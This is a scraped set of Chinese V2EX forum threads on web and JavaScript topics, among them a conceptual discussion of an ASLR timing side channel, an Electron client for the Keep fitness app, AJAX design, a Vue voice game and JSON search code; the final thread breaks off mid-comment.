{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://www.freebuf.com/vuls/127229.html\" rel=\"nofollow\">http://www.freebuf.com/vuls/127229.html</a>\r<br>\r<br><a target=\"_blank\" href=\"https://www.vusec.net/projects/anc/\" rel=\"nofollow\">https://www.vusec.net/projects/anc/</a>\r<br>这个有点厉害了\r<br>@<a target=\"_blank\" href=\"/member/yksoft1\">yksoft1</a>\r<br>@<a target=\"_blank\" href=\"/member/Virtao\">Virtao</a></div>"], "reply": "2", "tittle": "访问一个网站就能让 ASLR 保护失效?求大神解读", "comment": ["大致看了一下，大概原理是因为 MMU 有 TLB ， hit 和 miss 的时间不同，可以测量内存访问推断地址。", "ASLR 是一项很重要的防御手段没错，但是并不是 ASLR 是万能的，不能包治百病。\r", "大概看了一下，这攻击并不是让 ASLR 失效，而是绕过 ASLR 的保护找到内存地址。能绕过 ASLR 保护的手段不是刚刚才发明出来，只能说这种攻击手段提出了一种新的方法，降低了攻击 ASLR 保护的难度.\r", "其实这个问题可能没那么恐怖，攻击本身是使用了 CPU 的一些特性，浏览器作为解释器是可以做一些处理阻止这些攻击的。对于本地应用来说可能没办法阻止已经被执行的代码使用这些 CPU 特性，但是本地应用大多数不具备像浏览器引擎一样高度自由的运行一些指令的条件，这问题没有想象的那么恐怖。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>序</h2>\n<blockquote>\n<p>因为自己不大喜欢喜欢用手机，所以当在手机上看到有些应用只能在手机上使用时觉得好别扭，但我本身也不是写移动 App 的，只是会写点 js ，都说 js 啥都能干，那我就用它干！</p>\n</blockquote>\n<h2>关于 Keep</h2>\n<blockquote>\n<p>\"Keep 是一个热爱运动的年轻团队，同时也是一群追求极致体验的 Geek 。我们专注移动体育领域的应用开发，倡导开放共享的精神，不模仿，不跟风，只做酷的产品。\n在我们生活的这个年代里，健身运动文化正在觉醒，应该有更专业的工具，更纯粹的社区，让好身材来得更容易些。这就是 Keep 正在做的事情，我们希望通过科技驱动，让更多的人热爱健身，喜欢运动。\"\n<a href=\"http://www.gotokeep.com\" rel=\"nofollow\">以上内容节选自 keep 官网</a></p>\n</blockquote>\n<p><img alt=\"preview-1\" src=\"http://wodewone.github.io/app/keep/keep-zilv.jpg\"></p>\n<p>然而我只是一个喜欢运动的程序员，但是我比较懒~\n所以身材嘛~就不告诉你们！ 哈哈~~~</p>\n<h2>技术栈</h2>\n<blockquote>\n<p>悄悄的留下 Github 地址\n// <a href=\"https://github.com/wodewone/keepForMac\" rel=\"nofollow\">https://github.com/wodewone/keepForMac</a>\n喜欢的朋友请点个 start~ 谢谢！</p>\n</blockquote>\n<p>技术栈 <strong>electron + webpack + babel + react + es6 + sass + cssModules</strong></p>\n<h4>Electron</h4>\n<blockquote>\n<p>The Electron framework lets you write cross-platform desktop applications using JavaScript, HTML and CSS. It is based on Node.js and Chromium and is used by the Atom editor and many other apps.\n<a href=\"http://electron.atom.io/\" rel=\"nofollow\">节选自 electron 官网</a></p>\n</blockquote>\n<blockquote>\n<p>使用 electron 创建的最典型的应用 Atom</p>\n</blockquote>\n<p><a href=\"https://atom.io/\" rel=\"nofollow\"><img alt=\"Atom\" src=\"http://electron.atom.io/images/apps/atom-icon.png\"></a></p>\n<p><a href=\"http://electron.atom.io/apps/\" rel=\"nofollow\">更多应用请点击查看</a></p>\n<h2>main</h2>\n<h3>运行效果图</h3>\n<p><img alt=\"preview-10\" src=\"http://upload-images.jianshu.io/upload_images/2020993-d66c030277689d32.jpg\"></p>\n<h3>下载体验</h3>\n<blockquote>\n<p><a href=\"https://pan.baidu.com/s/1slARRid\" rel=\"nofollow\">最新测试版本泄露</a>由于目前功能还没有达到我理想中的可用版本，所以暂时为测试版，如发现有严重问题欢迎来 push issues</p>\n</blockquote>\n<blockquote>\n<p>关于项目进度以及在开发中遇到的问题我会在<a href=\"http://wodewone.github.io/2016/12/03/%E4%BD%BF%E7%94%A8js%E5%88%9B%E5%BB%BAmacOS%E5%BA%94%E7%94%A8/\" rel=\"nofollow\"><strong>我的博客</strong></a>内持续更新，也欢迎大家留言！~</p>\n</blockquote>\n<h3>项目结构</h3>\n<p>结构图</p>\n<pre><code>.\n├── ./Doc-api-keep.md\t\t# 已知 api 接口\n├── ./app\t\t\t\t\t\t# webapck 编译打包压缩生成的文件\n├── ./build\t\t\t\t\t# electron-builder 生成安装包配置目录\n│   ├── ./build/background.png   # (macOS DMG background)\n│   ├── ./build/icon.icns        # (macOS app icon)\n│   └── ./build/icon.ico         # (Windows app icon)\n├── ./dev-server.js\n├── ./json\t\t\t\t\t# 部分 Api 接口数据\n├── ./main.js\t\t\t\t\t# electron 初始化文件\n├── ./package.json\n├── ./preview\t\t\t\t\t# 项目运行预览图\n├── ./src\n│   ├── ./src/assets\t\t# 静态资源文件\n│   ├── ./src/components\t# 项目组件文件\n│   ├── ./src/js\t\t\t\t# 主模块文件\n│   ├── ./src/main.js\t\t# render 进程入口文件\n│   └── ./src/sass\t\t\t# 样式文件\n└── ./webpack.config.js\t\t# webpack 配置文件\n</code></pre>\n<blockquote>\n<p>提供两个在线将<code>png</code>转<code>icns</code>的工具地址\n<a href=\"http://www.easyicon.net/covert/\" rel=\"nofollow\">easyicon</a>\n<a href=\"https://iconverticons.com/online/\" rel=\"nofollow\">iconverticons</a></p>\n</blockquote>\n<h3>Main process</h3>\n<blockquote>\n<p><code>electron</code> 分为两个进程去管理一个是<strong>主进程</strong>由<code>Node</code>提供服务，负责和系统进行操作与 GUI 亲密接触，一个是<strong>渲染进程</strong>也就是我们平常写的 web 页面。但是<code>electron</code>提供了一系列接口可以让你在两个进程间随时通信（详细内容请渲染进程<a href=\"https://github.com/electron/electron/tree/master/docs-translations/zh-CN#%E5%9C%A8%E6%B8%B2%E6%9F%93%E8%BF%9B%E7%A8%8B%E7%BD%91%E9%A1%B5%E5%86%85%E5%8F%AF%E7%94%A8%E7%9A%84%E6%A8%A1%E5%9D%97\" rel=\"nofollow\">可用模块</a>）\n这里我只简单的介绍下，有兴趣的同学可以参考下这两片文章，入门很不错！</p>\n<ol>\n<li><a href=\"https://zhuanlan.zhihu.com/p/20225295\" rel=\"nofollow\">使用 Electron 构建桌面应用</a></li>\n<li><a href=\"https://gold.xitu.io/entry/56aae5e4a633bd0257ae4ab8\" rel=\"nofollow\">[译文] 通过 Electron 开发一个简单地桌面应用</a>\n另外官网还有很多 <a href=\"http://electron.atom.io/apps/\" rel=\"nofollow\">优秀的 App</a>\n然后 <a href=\"https://github.com/sindresorhus/awesome-electron\" rel=\"nofollow\">这里</a> 也收集了很多不错的示例，都是在<code>Github</code>上开源的，大家可以下载体验\n最后这个是<a href=\"http://electron.atom.io/docs/\" rel=\"nofollow\">官方文档</a>，以及<a href=\"https://github.com/electron/electron/tree/master/docs-translations/zh-CN\" rel=\"nofollow\">中文文档</a></li>\n</ol>\n</blockquote>\n<p>这个是我的主进程代码\n./main.js</p>\n<pre><code>const {app, BrowserWindow} = require('electron')\nconst path = require('path')\n\nlet keep\n\nconst createWindow = () =&gt;{\n    keep = new BrowserWindow({\n        'width': 999,\n        'minWidth': 999,\n        'height': 666,\n        'minHeight': 666,\n        //'resizable': false,\n        'title': 'Keep',\n        'center': true,\n        'titleBarStyle': 'hidden',\n        'zoomToPageWidth': true,\n        'frame': false,\n        'show': false\n    })\n\n    keep.loadURL(`file://${__dirname}/app/index.html`)\n\n    //keep.webContents.openDevTools()\n    keep.webContents.on( 'did-finish-load', function () {\n        keep.show();\n    })\n\n    keep.on('close', (e) =&gt; {\n        keep = null\n    })\n\n};\n\napp.on('ready', createWindow)\n\napp.on('window-all-closed', () =&gt; {\n    if (process.platform !== 'darwin') {\n        app.quit()\n    }\n})\n\napp.on('activate',() =&gt; {\n    if (app == null)\n        createWindow()\n    app.show()\n})\n</code></pre>\n<h3>Render process</h3>\n<blockquote>\n<p><strong>渲染进程</strong></p>\n</blockquote>\n<p>./src/main.js 部分代码</p>\n<pre><code>ReactDOM.render(\n    &lt;Router history={hashHistory}&gt;\n        &lt;Route path='/' onEnter={RequireAuth} component={App}&gt;\n            &lt;IndexRoute component={AppTraining}&gt;&lt;/IndexRoute&gt;\n            &lt;Route path='training' component={AppTraining}&gt;&lt;/Route&gt;\n                &lt;Route path='plan/:plan_id' component={AppWorkout}&gt;\n                    &lt;Route path=':desc_id' component={WorkoutDescription}&gt;&lt;/Route&gt;\n                &lt;/Route&gt;\n\n            &lt;Route path='explore' component={AppExplore}&gt;&lt;/Route&gt;\n            &lt;Route path='record' component={AppRecord}&gt;&lt;/Route&gt;\n            &lt;Route path='user-center' component={AppUserCenter}&gt;&lt;/Route&gt;\n        &lt;/Route&gt;\n        &lt;Route path='/login' component={AppLogin}&gt;&lt;/Route&gt;\n    &lt;/Router&gt;,\n    document.getElementById('app')\n)\n</code></pre>\n<h2>鉴赏图</h2>\n<p>欢迎大家评鉴</p>\n<p><img alt=\"preview-1\" src=\"http://upload-images.jianshu.io/upload_images/2020993-900fc09bfc54cd3f.jpg\">\n<img alt=\"preview-2\" src=\"http://wodewone.github.io/app/keep/preview/preview-2.jpg\">\n<img alt=\"preview-3\" src=\"http://wodewone.github.io/app/keep/preview/preview-3.jpg\">\n<img alt=\"preview-4\" src=\"http://wodewone.github.io/app/keep/preview/preview-4.jpg\">\n<img alt=\"preview-5\" src=\"http://upload-images.jianshu.io/upload_images/2020993-b3c32aff8378a83f.jpg\">\n<img alt=\"preview-6\" src=\"http://upload-images.jianshu.io/upload_images/2020993-ffa1085241f13c22.jpg\">\n![preview-7]( <a href=\"http://upload-images.jianshu.io/upload_images/2020993-0e33e04aa18ce231.jpg\" rel=\"nofollow\">http://upload-images.jianshu.io/upload_images/2020993-0e33e04aa18ce231.jpg</a>\n<img alt=\"preview-8\" src=\"http://upload-images.jianshu.io/upload_images/2020993-f50db493e11d2c88.jpg\">\n<img alt=\"preview-9\" src=\"http://upload-images.jianshu.io/upload_images/2020993-2849ac333d622cee.jpg\"></p>\n<h2>后续</h2>\n<blockquote>\n<p>因为当前版本还没有完全的可以使用，只是完成了部分功能(虽然完成了核心的功能但是尚有不足，有兴趣的可以关注我的<a href=\"http://wodewone.github.io/\" rel=\"nofollow\">博客</a>， Github 将持续为您导航~)</p>\n</blockquote>\n</div></div>"], "reply": "26", "tittle": "用 ReactJs 创建 Mac 版的 keep - [ keep for mac ]", "comment": ["看标题我还以为是 Google Keep", " 哈哈、就看大家对“ keep ”的认识程度啦！~", "楼主，我的技术栈和您这套基本一样，我看了，一些 BUG ，我可以帮忙， QQ 383146 九 50,我们可以一起做。", "关注一下，对这套技术栈有兴趣", "这套技术栈能在 win 下实现吗？", " electron 本身跨平台", "求问: 怎么把 reactjs 打包成 mac app ? 跪求 在线等  急", "我用手机投屏到电视上", "很棒啊  赞", "我还以为是 Google Keep...", "用 iPhone 的 keep 的唯一原因是能连上 Apple Watch", "感觉很棒", "马克 厉害", " 如果你只是 reactjs 是不行的，要搭配 electron 然后我用的 electron-builder 然后具体的操作可以参考我博客里面的，里面还有一些其他的，前提是你要先用 electron~\r", "这个是我写这个项目的一些日记\r", " 好的，谢谢，回家我试试", "也以为是 google 的 keep", "app 很帅， 各种花纹，美头像，还以为 lz 是妹子呢，结果-。-\r", " jwt 的 api ， lz 连得上？ keep 官方的么?", "我想问 electron 的 title 样式怎么定义。", " 是官方的，而且现在是有点 bug~", " 我设置 electron 的 'titleBarStyle': 'hidden', 然后自己 diy 一个，然后给他加上 css ：  -webkit-app-region: drag; 这样就能拖动了，具体的你可以 clone 下来看看~", "楼主还可以 convert 成 react native 的（", "肯定很多人以为是 Google Keep 兴冲冲点进来发现被坑", "写得不错～我也写过两个应用， Electron 真的很好用", "打开 Mac 炼 keep ？赞。", " 有一天我突发奇想在安卓设备上唤醒 Google 语音 OK Google Open Keep 打开不是 Google keep 是这个 keep ……", "WOW 赞👍🏻"]},
{"content": ["<div class=\"topic_content\">throw...try...catch...finally 和大多数 domexception 是默认冒泡的， abstractworker. onerror 不冒，然后 promise.reject 可以延迟处理，却又出了个 onunhandledrejection\r<br>\r<br>。。。\r<br>\r<br>这是否意味着js从及时报错哲学转向带错执行哲学？\r<br>其实我一直不懂错误处理的初衷，上下文丢失是很讨厌的事情，但错误处理不能规避死循环，其还原上下文的能力非常有限</div>", "<div class=\"topic_content\">zhihu: <a target=\"_blank\" href=\"https://www.zhihu.com/question/56288594\" rel=\"nofollow\">https://www.zhihu.com/question/56288594</a></div>", "<div class=\"topic_content\">我发现在奇葩的 firefox55 中 absractworker. onerror 会再次抛到 window. onerror ，得用 event.preventDefault()拦下。</div>"], "reply": "10", "tittle": "如何评价 JS 的错误处理？", "comment": ["有啥好评价的啊   应用内要用 try catch 的地方都用 if 来处理就可以了   只在应用的最外层做一个 try catch 来作为保护", "JS ：你的哲学我不懂", "首先你要能把语言和应用环境分开，这个问题才有讨论的价值， js 的错误处理很简单，就一个 try/catch/finally ，没有冒泡没有全局处理\r", "\r", "而你说的 domexception 、 onerror 、 unhandledrejection 都是应用环境下的异常处理，这在任何一个语言 /框架里都是存在的，比如 ", " 的 Application_Error ，比如 Spring MVC 的 @", " ，比如 ROR 的 exceptions_app ，在一个应用环境中，异常一定是要“冒泡”到全局下统一处理的，否则造成应用的崩溃在生产环境是一件非常危险的事情", " try/catch/finally 也算冒泡，如果不考虑 tick ，可以处理全局错误", " 你要这么算也行，我没见过 exception 不冒泡的语言", " go", "js 设计的不合理之处不是一点两点了， exception 和 promise 的问题，习惯就好了\r", "有句话说，错就错到底，就算错了大家都学会了就成了 feature\r", "结果看箭头函数的 this ， array 新函数对空白位的处理，这异常又多个黑点\r", "\r", "当然我习惯是 if 把条件全检查好了，如果这都能出异常那真是牛逼。。", "同步: .try...catch\r", "异步: promise.reject\r", "全局错误: onunhandledrejection\r", "只是某些例如 jquery 这种库为了操作 dom 方便把 dom 操作的报错去掉了，所以某些人会觉得混乱\r", "上下文丢失是实现问题，并不是设计问题，要么使用辅助库，要么等修复完善", " Go 那个不叫 exception 吧，你怎么不说 C 呢", "年轻的时候也经常思考各种设计是不是正确。现在觉得，对于 `javascript` 这样的东西，思考太多并没有什么用，爱用用不用滚是一般的结论，（摊手"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>感觉一般 ajax 都是直接返回 json.\n难道是因为 html 比 json 大的原因？</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>看了这么多回复，大概的原因是这个</p>\n<ol>\n<li>前后端分离.(但是我的管理后台，不需要前端，用bootstrap就好了，所以pass)</li>\n<li>减少带宽。(我的管理后台不怎么在乎性能，用的没有几个人。pass)</li>\n<li>降低服务器的cpu。（我现在服务器cpu不到50%，pass）</li>\n<li>移动端。(没有移动端。。要有移动端的话，就需要前端来写样式了。。所以还是pass)</li>\n</ol>\n<h3></h3>\n<p>所以我直接返回html，对我这个项目是合适的？</p>\n</div></div>"], "reply": "36", "tittle": "用了这些久 ajax 为什么感觉 ajax 直接返回 html 用得少啊", "comment": ["还得后台渲染是不是加重了负担？", "用 ajax 的其中一个目的就是服务端只处理业务，然后返回业务处理后的结果，以 json 格式返回，就可以做到前后端分离了。\r", "如果返回 html ，那后端开发的时候还得去考虑到底某句话要放在什么标签里面，某个地方要搭配什么 icon 用什么 css ，而这些本应该是前端的工作。", "HTML --> HyperText Markup Language ，是标记语言，不是数据结构", " 是为了前后端的目的是吧，那如果是一个管理后台这种几乎不需要前端的，那就可以返回 html 了？", "早期 jquery 的 onload 没有用过吗？", " 管理后台几乎不需要前端？那这种 web 程序都可以直接静态网页就够了！", " 用 bootstrap 就好了呀 ，小公司后端样式不怎么看重，看重也没办法", "有返回 xml 的，你指的应该是这个吧。", "b 站搜索页面点下一页返回的就是个 html 然后嵌进去的。", " 那种估计是 pjax ，那种东西不会用", "万一前端模板变了啊", " 那你这贴有结论了……因为返回 html 的你定义为 pjax 了……", "麻雀虽小，该有的都得有。后台管理不只是样式吧。前期图“省事”（还不一定），后期就费劲了。", " 不一样啊，那种不仅返回的是 html 并且好像 page 的变化也要表现在 history 里面", "几年前 ajax 刚开始的时候大家都返回 html 直接替换一块 dom 的。直到后来前端开始有架构了，从 backbone 开始，到 angular/react 才没人这么干了。", "比如现在的 express + ejs 模板，这种就是直接返回 html 模服务器渲染的，现在也是油公司这样开发的，配合内部框架，前后台一人搞定", "backbone 貌似就是返回 html 的，没用过", " 对我个人来说，因为我要同时做前端和后端，所以我的 ajax 一般是返回 html ，这样我的 html 代码就可以复用了", "还有考虑到移动端的需要， 前后端分离其中的一个好处", "上古时代 ajax 确实主要返回 xml 和 html", "不少。看 Pjax 和 Turbolinks 。 React 也可以 server 端 render 。前端不复杂（仅仅需要无刷新跳转，而不是类似 gmail 这样的页面内逻辑）的网站用这种方式更方便。\r", "\r", "我现在比较偏向与用这种方式再在需要复杂前端的页面嵌入 React 。", "不少啊，返回的 500 错误都是 html 啊，（斜眼笑", "用 rails 的时候偶尔会这么干，虽然感觉不太好，但比在前端用 js 写逻辑方便多了。", "分页和无刷新加载我都是使用 ajax 返回 html, 直接用 ajax 获取下一页地址然后获取到下一页的 html, 直接填充到当前网页就行了.", " 一样的工作原理，只不过现在浏览器支持 pushstate 了 为了体验好很多网站就顺便更新了地址栏而已。", "除去上面已经提到的前后端分离，还有性能的影响，现在前端很少直接写整个 html 的了，而且现在“需要”返回 html 的情况非常少吧，除非你说要替换大部分 dom ，有点类似潜入 iframe 的感觉，但这是有具体需求的情况下才会这样用（比如防止 js/css 污染等，绝大多数在线 code 编辑器都是用的 iframe ）\r", "\r", " 并没有理解你所说代码复用是什么情况， html 作为 view 本来就是复用的，但这和返回 json 并不冲突啊， html(layout 不变) +  json(数据动态变化) -> 完整页面", " gmail 好像只更新了 #号后面内容， 而且很久之前就是这样了，不知道它用的什么方案。", "1 、减少服务端渲染的步骤，节约服务器的资源 \r", "2 、前后端分离，可以让一个接口服务不同的前端，前端爱怎么渲染怎么渲染，这里的前端当然包括移动端等 \r", "3 、只传数据可以减少传输的字节，节约带宽就是节约金钱", "我之前的单位就是这样做的， ajax 直接返回 html 。\r", "\r", "还有把整个 dom 干掉， ajax load 一个新的 html 到页面上，也是经常用的......\r", "#所谓的无缝刷新...", "看你怎么用，我自己一个人写都是返回 json", "你可以查下前后端分离的具体做法", "踩过坑就知道为啥以前流行的 ajax 返回 html 现在不流行转而流行只返回数据了", "这是 pjax ，最有名的使用者是  Github 。\r", "你在项目切换代码文件目录，就可以看到 pjax 的 xhr", "pjax", "直接返回 json 格式的数据，有利于多环境的使用，比如多个页面中只是数据一样，但是展示的方式不一样；还有就是接口维护方便，当字段发生改变时，前端页面的展示尽量不受到影响", "ajax 返回 html 没什么问题，简单易用。至于什么时候返回 json ，你到时候自然会明白。选择适合你当前的用法就行了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>预览地址： <a href=\"https://8.diamondfsd.com/\" rel=\"nofollow\">https://8.diamondfsd.com/</a>   （谷歌浏览器打开最佳，不支持移动端，不支持 IE ）</p>\n<blockquote>\n<p>会有麦克风权限申请，需要允许才可以正常玩耍，如果不小心点了禁止，可以在浏览器地址栏的右边，重新点击允许</p>\n</blockquote>\n<p>Github:  <a href=\"https://github.com/k55k32/quaver\" rel=\"nofollow\">https://github.com/k55k32/quaver</a></p>\n<p><strong>游戏截图</strong>\n<img alt=\"alt\" src=\"https://file.diamondfsd.com/img/15be4483-b6be-4bdf-9617-7dedbce137c0b\"></p>\n<h2>由来</h2>\n<p>最近看这个游戏比较火，个人也是比较闲。<br>\n今天花了一下午的时间，来完成这个当前比较火的小游戏，八分音符。<br>\n看了这个游戏，原理也很简单，我们只需要获得声音，然后把声音转换为数字，最后控制小人移动就可以了。</p>\n<h2>声音的输入</h2>\n<p>我们发现这个游戏的原理很简单，就是通过声音来控制小人移动，声音越大，跳得越高。<br>\n所以要做这个小游戏，我们就首先要解决的问题就是，如何从浏览器获得声音。这方面的东西，我以前也接触的不多。所以我只能先面向谷歌编程。<br>\n最后我搜索到了这篇文章： <a href=\"http://javascript.ruanyifeng.com/htmlapi/webrtc.html\" rel=\"nofollow\">WebRTC</a> ， WebRTC 主要让浏览器具备三个作用:</p>\n<blockquote>\n<p>获取音频和视频\n进行音频和视频通信\n进行任意数据的通信</p>\n</blockquote>\n<pre><code>navigator.getUserMedia({\n    video: true, \n    audio: true\n}, onSuccess, onError);\n</code></pre>\n<p>通过 navigator.getUserMedia 方法，我们可以获得麦克风的音频流，看到这里，我们第一个问题已经解决了，解决了声音的输入。</p>\n<h2>声音的输出</h2>\n<p>获得了声音输入后，如何把输入的声音转换为我们编程可以使用的量化数字呢，我们需要更详细的文档  <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/AudioContext\" rel=\"nofollow\">WebAPI 接口 &gt; AudioContext </a>。通过参考这篇文档，结合一些实例，最终我写了一个 AudioAPI.js 用于将声音数据，量化为我们需要的声音大小数字。</p>\n<pre><code>const navigator = window.navigator\nnavigator.getUserMedia = navigator.getUserMedia ||\n                          navigator.webkitGetUserMedia ||\n                          navigator.mozGetUserMedia ||\n                          navigator.msGetUserMedia\nconst AudioContext = window.AudioContext ||\n                      window.webkitAudioContext\n\nconst isSupport = !!(navigator.getUserMedia &amp;&amp; AudioContext)\nconst context = isSupport &amp;&amp; new AudioContext()\nexport default {\n  isSupport,\n  start () {\n    // https://developer.mozilla.org/zh-CN/docs/Web/API/AudioContext  AudioContent API\n    return new Promise((resolve, reject) =&gt; {\n      navigator.getUserMedia({audio: true}, stream =&gt; { // 申请浏览器麦克风权限\n        const source = context.createMediaStreamSource(stream)\n        // 该对象可以获得声音的频率数据 https://developer.mozilla.org/zh-CN/docs/Web/API/AudioContext/createAnalyser \n        const analyser = context.createAnalyser() \n        source.connect(analyser)\n        analyser.fftSize = 2048\n        resolve(analyser)\n      }, () =&gt; {\n        reject()\n      })\n    })\n  },\n  getVoiceSize (analyser) {\n    const dataArray = new Uint8Array(analyser.frequencyBinCount)\n    // 这里会获得一个数组，数字的下标表示频率，数组的值表示频率波大小\n    // 通过对这些值的一个简单累加，就可以得到一个数字，用于游戏中表示声音的大小\n    analyser.getByteFrequencyData(dataArray)\n\n    const data = dataArray.slice(100, 1000)  // 只获得 100 - 1000Hz 的声音频率大小\n    const sum = data.reduce((a, b) =&gt; a + b)  // 将这些值累加\n    return sum\n  }\n}\n</code></pre>\n<p>通过 <code>AudioAPI.start()</code> 开启麦克风，返回一个 <code>Promise</code>，可以获取到 一个  <code>AnalyserNode</code>对象， 通过该对象的 <code>getByteFrequencyData</code> 方法，可以获取到实时的声音频率数据。</p>\n<h2>小人的 “移动”</h2>\n<p>因为之前没有写过游戏，不知道正常的写一个类跑酷的游戏需要怎么写。所以我就照着自己的想法来吧。首先，小人是不会动的，动的只是背景。底部的每一个黑块都是一个 DOM 。<br>\n具体的代码可以看源码里面的 <code>Game.vue</code> 组件，因为全部代码比较长，这里就简单讲解一下。我们可以通过比较底部黑块和小人的位置 获得以下值:  <strong>小人是否紧贴黑块上面？</strong></p>\n<p>如果符合该条件，那么他就可以跳，而且不会再下降了。如果不在黑块上面，那么他就会一直下落:</p>\n<ol>\n<li>落到黑快上，就又符合 在黑块上 这个条件了，那么通过声音的收集，如果大于一定的量，小人就又跳起来了。 底下的黑块是一直向左移动的，看上去是小人在走的样子。</li>\n<li>落到空白处，会一直下降，如果碰不到黑块，那么降到最底部的时候，游戏结束</li>\n</ol>\n<p><img alt=\"alt\" src=\"https://file.diamondfsd.com/img/2f96d884-4f74-4cd1-a000-9f1ef6a378fc7\"></p>\n<h2>项目源码</h2>\n<p>这三个问题解决了，这个游戏就完成了，当然，还有很多可以润色的地方。例如加上游戏背景音乐，在跳的时候加上音效，游戏结束的一些效果，声音收集的灵敏度，积分排行等。这些东西就留到下次再写吧，当然大家有兴趣也可以参与进来完成这方面的工作。</p>\n<p>如果大家觉得还不错的话，就去 Github 上帮我点个 Star 吧。</p>\n<p>Github:  <a href=\"https://github.com/k55k32/quaver\" rel=\"nofollow\">https://github.com/k55k32/quaver</a></p>\n<p>预览地址： <a href=\"https://8.diamondfsd.com/\" rel=\"nofollow\">https://8.diamondfsd.com/</a>   （谷歌浏览器打开最佳，不支持移动端，不支持 IE ）</p>\n</div></div>"], "reply": "6", "tittle": "用 Vue + Audio API 实现的热门小游戏，八分音符", "comment": ["记得原游戏的移动方式和音调也有关，大致看了一下源码，你似乎只是判断了音量？", "没有结束么？", " 是将所有频率的音量加起来了。 如果音调高的话，那应该在高频区的数值会很高。\r", "\r", "原游戏是有一定算法的，我对音频方面不太了解，所以就简单粗暴的加到一起，合成一个值了", " 有的呀，游戏只随机生成了 50 个黑块，走完就------\r", "必死无疑 哈哈", "Vue 萌新路过，已 star ！", "最近在学 vue ，看看"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>初学 Web 和 JavaScript，遇到了奇怪的问题。</p>\n<p>例如在<a href=\"http://www.gsxt.gov.cn/index.html\" rel=\"nofollow\">这个网页</a>中，有一个 <code>location_info</code> 变量，找遍了所有 JS 文件都看不到哪里修改了这个变量，用 Chrome 调试后发现是这个函数，但是也找不到这个函数的出处……</p>\n<p><img alt=\"\" src=\"//static.32ph.com/upload-pic/nxese.jpg\"></p>\n</div></div>"], "reply": "2", "tittle": "Chrome 调试 JavaScript 的疑问", "comment": ["VM 这种开头的 一般都是 eval 出来的东西，看 homepage.js ::formatted 277 行   然后你把他请求的 ajax 的返回内容用他的回调函数走一下你就发现了，也就是个 charcode 的混淆", "curl ", "\r", "\r", "[102,117,110,99,116,105,111,110,32,99,104,101,99,107,95,98,114,111,119,115,101,114,40,100,97,116,97,41,123,32,10,32,32,32,32,32,108,111,99,97,116,105,111,110,95,105,110,102,111,32,61,32,100,97,116,97,46,118,97,108,117,101,32,94,32,53,51,54,56,55,48,57,49,49,10,125,32,10,108,111,99,97,116,105,111,110,95,105,110,102,111,32,61,32,52,57,48,57,52,50,49,48,56,52,59]\r", "\r", "curl ", " | node -p 'JSON.parse(fs.readFileSync(0, \"utf8\")).map(x=>String.fromCharCode(x)).join(\"”)'\r", "\r", "function check_browser(data){\r", "     location_info = data.value ^ 536870911\r", "}\r", "location_info = 4909421084;\r", "\r", "现在政府网站也玩这无聊的一手？"]},
{"content": ["<div class=\"topic_content\">var data = [{\r<br>　id: 1,\r<br>　value: 2532,\r<br>　son: [{\r<br>　　id: 5,\r<br>　　value: 543,\r<br>　　son: [{\r<br>　　　id: 46,\r<br>　　　value: 999879,\r<br>　　　son: [{\r<br>　　　　id: 12,\r<br>　　　　value: 903,\r<br>　　　　son: []\r<br>　　　}]\r<br>　　}]\r<br>　}]\r<br>}, {\r<br>　id: 3,\r<br>　value: 4684,\r<br>　son: [{\r<br>　　id: 11,\r<br>　　value: 65,\r<br>　　son: []\r<br>　}, {\r<br>　　id: 45,\r<br>　　value: 523423,\r<br>　　son: []\r<br>　}]\r<br>}]\r<br>\r<br>一个无穷节点的 json，深度有几十级，超大，我要查询 id 为 46 的 value 是多少，求一个 js 函数，谢谢。</div>"], "reply": "8", "tittle": "求助，如何在 json 中检索数据？", "comment": ["做成一个 b 树？", "function search(id, data) {\r", "  data.forEach( d => {\r", "    if (d.id == id) {\r", "      console.log(d.value)\r", "    }\r", "    search(id, d.son)\r", "  })\r", "}\r", "\r", "search(46, data)", "放到 NoSQL 里面，随便 query 。 MongoDB ， elastic search 什么什么的，都可以", "整个 JSON 就是一个字符串，你直接 indexOf 不行吗？别把简单问题复杂化呀。", "lodash?", "递归", "function a(data, id) {\r", "\t\t\tvar value;\r", "\r", "\t\t\tfunction forEachs(arr) {\r", "\r", "\t\t\t\tarr.forEach(function(d) {\r", "\t\t\t\t\tfind(d, id);\r", "\t\t\t\t\td.son != 0 && forEachs(d.son) // : find(d.sum);\r", "\r", "\t\t\t\t})\r", "\r", "\t\t\t}\r", "\r", "\t\t\tfunction find(d, id) {\r", "\t\t\t\tif(d.id == id) {\r", "\t\t\t\t\tvalue = d.value\r", "\t\t\t\t}\r", "\t\t\t}\r", "\t\t\t\r", "\t\t\tforEachs(data);\r", "\t\t\treturn value\r", "\t\t}\r", "\r", "\t\tconsole.log(a(data, 46));", "function search(array, id, temp) {\r", "    let data = array.concat(),\r", "        result = temp || {};\r", "    data.forEach(item => {\r", "        if (item.id === id) {\r", "            result = item;\r", "            return;\r", "        } else if (Object.prototype.toString.call(item.son) === '[object Array]' &&\r", "            item.son.length) {\r", "            result=search(item.son, id, result);\r", "        }\r", "    })\r", "    return result;\r", "}\r", "search(data, 46);//{ id: 46, value: 999879,son: [ { id: 12, value: 903, son: [] } ] }"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;Test&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;Test&lt;/h1&gt;\n&lt;p&gt;点击这个试一下&lt;/p&gt;\n\n&lt;script&gt;\n    var h = document.querySelector('h1');\n    var p = document.querySelector('p');\n    \n    h.addEventListener('click', function () {\n        console.log('h1');\n    });\n    \n    p.addEventListener('click', function () {\n        console.info('clicked');\n        p.click();\n        p.click();\n        p.click();\n        p.click();\n        h.click();\n    });\n    \n    p.click();\n&lt;/script&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>打开页面的时候会无限循环吗？\n手动点一下 p 标签会无限循环吗？</p>\n</div></div>"], "reply": "3", "tittle": "这段代码会无限循环吗？", "comment": ["这么简单的代码   你运行试试看就知道了啊", "不会，但是 